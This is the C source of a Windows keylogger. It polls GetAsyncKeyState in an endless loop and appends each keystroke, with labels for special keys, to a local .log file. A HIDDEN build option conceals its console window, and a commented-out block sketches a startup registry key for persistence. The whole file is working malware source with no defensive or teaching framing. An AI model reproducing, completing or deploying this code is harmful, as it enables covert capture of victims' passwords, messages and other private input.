#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<winuser.h>
#include<windowsx.h>
#include<stdint.h>
#include<memory.h>
#include<signal.h>

char baseName[100];
char logFileName[100];

int test_key(void);
int create_key(char *);
int get_keys(void);

void myUsleep(__int64 usec);

int main(int argc, char const *argv[])
{
	if (argc != 2) {
		fprintf(stderr, "must specify basename\n");
		exit(0);
	}

	memset(baseName, '\0', sizeof(baseName));
	memset(logFileName, '\0', sizeof(logFileName));

	strcpy(baseName, argv[1]);
	strcpy(logFileName, argv[1]);
	strcat(baseName, ".exe");
	strcat(logFileName, ".log");

	#ifdef HIDDEN
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	#endif
	
	/*int test = test_key();

	if (test == 2) {
		const char *folder = "c:\\%windir%\\";
		char path[2000];
		strcpy(path, folder);
		strcat(path, argv[1]);
		create_key(path);
	}
	*/

	get_keys();

	return 0;
}

int get_keys()
{
	static FILE *file = NULL;
	short character;
	while (1) {
		myUsleep(1);
		for (character = 8; character <= 222; character++) {
			if (GetAsyncKeyState(character) == -0x7fff) {
				if (file == NULL) file = fopen(logFileName, "a");
				if (file == NULL) return 1;

				if (39 <= character && character <= 64) {
					putc(character, file);
					fflush(file);
					break;
				} else {
					if (64 < character && character < 91) {
						character += ' ';
						putc(character, file);
						fflush(file);
						break;
					} else {
						switch(character) {
							case VK_SPACE:
								putc(' ', file);
								break;
							case VK_SHIFT:
								fputs("[SHIFT]", file);
								break;
							case VK_RETURN:
								fputs("\n[ENTER]", file);
								break;
							case VK_BACK:
								fputs("[BACKSPACE]", file);
								break;
							case VK_TAB:
								fputs("[TAB]",file);
								break;
							case VK_CONTROL:
								fputs("[CTRL]",file);
								break;
							case VK_DELETE:
								fputs("[DEL]", file);
								break;
							case VK_OEM_1:
								fputs("[;:]", file);
								break;
							case VK_OEM_2:
								fputs("[/?]", file);
								break;
							case VK_OEM_3:
								fputs("[`~]", file);
								break;
							case VK_OEM_4:
								fputs("[ [{ ]", file);
								break;
							case VK_OEM_5:
								fputs("[\\|]", file);
								break;
							case VK_OEM_6:
								fputs("[ ]} ]", file);
								break;
							case VK_OEM_7:
								fputs("['\"]", file);
								break;
							case VK_NUMPAD0:
								fputc('0', file);
								break;
							case VK_NUMPAD1:
								fputc('1', file);
								break;
							case VK_NUMPAD2:
								fputc('2', file);
								break;
							case VK_NUMPAD3:
								fputc('3', file);
								break;
							case VK_NUMPAD4:
								fputc('4', file);
								break;
							case VK_NUMPAD5:
								fputc('5', file);
								break;
							case VK_NUMPAD6:
								fputc('6', file);
								break;
							case VK_NUMPAD7:
								fputc('7', file);
								break;
							case VK_NUMPAD8:
								fputc('8', file);
								break;
							case VK_NUMPAD9:
								fputc('9', file);
								break;
							case VK_CAPITAL:
								fputs("[CAPS LOCK]", file);
								break;
							default:
								fputs("[unk]", file);
								break;
						}
					}
				}
			}
		}
	}

	return 0;
}

void myUsleep(__int64 usec)
{ 
    HANDLE timer; 
    LARGE_INTEGER ft; 

    ft.QuadPart = -(10*usec); // Convert to 100 nanosecond interval, negative value indicates relative time

    timer = CreateWaitableTimer(NULL, TRUE, NULL); 
    SetWaitableTimer(timer, &ft, 0, NULL, NULL, 0); 
    WaitForSingleObject(timer, INFINITE); 
    CloseHandle(timer); 
}